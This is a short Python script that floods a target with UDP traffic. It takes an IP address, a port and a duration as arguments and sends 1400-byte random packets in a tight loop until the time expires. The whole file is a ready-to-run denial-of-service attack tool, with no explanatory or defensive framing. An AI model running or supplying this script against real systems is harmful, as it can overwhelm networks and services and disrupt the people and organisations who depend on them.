import socket, random, sys, time
ip = sys.argv[1]
port = int(sys.argv[2])
duration = int(sys.argv[3])

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1400)
timeout = time.time() + duration

while time.time() < timeout:
    for _ in range(100):
        sock.sendto(bytes, (ip, port))